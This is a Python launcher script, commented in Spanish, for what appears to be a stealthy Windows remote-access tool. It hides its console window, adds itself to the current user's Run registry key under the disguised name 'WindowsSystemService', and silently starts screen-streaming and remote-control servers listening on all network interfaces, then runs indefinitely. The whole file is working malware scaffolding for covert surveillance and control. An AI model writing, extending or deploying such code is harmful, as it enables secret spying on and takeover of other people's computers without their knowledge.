#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
import time
import sys
import os
import winreg
import ctypes
from screen_server import ScreenServer
from remote_control_system import ControlServer
from security_config import SecureConfig


def hide_console():
    """Ocultar ventana de consola completamente"""
    try:
        if os.name == 'nt':
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass


def setup_persistence():
    """Establecer persistencia automática en registro"""
    try:
        current_file = os.path.abspath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "WindowsSystemService", 0, winreg.REG_SZ, current_file)
        return True
    except Exception as e:
        return False


def get_network_info():
    """Obtener información de red para auto-detección"""
    try:
        import socket
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except:
        return "127.0.0.1"


class StealthServer:
    def __init__(self):
        self.config = SecureConfig()
        self.encryption_key = self.config.setup_encryption()
        self.local_ip = get_network_info()

    def start_servers(self):
        """Iniciar todos los servidores en modo stealth"""
        # Servidor de pantalla
        screen_server = ScreenServer(
            host='0.0.0.0',
            port=5555,
            encryption_key=self.encryption_key
        )

        # Servidor de control
        control_server = ControlServer(
            host='0.0.0.0',
            port=5560,
            encryption_key=self.encryption_key
        )

        # Iniciar en hilos
        threading.Thread(target=screen_server.start_server, daemon=True).start()
        threading.Thread(target=control_server.start_server, daemon=True).start()

        return screen_server, control_server

    def run(self):
        """Ejecución principal stealth"""
        hide_console()
        setup_persistence()

        screen_server, control_server = self.start_servers()

        # Ejecución eterna silenciosa
        while True:
            time.sleep(3600)  # Dormir 1 hora


if __name__ == "__main__":
    server = StealthServer()
    server.run()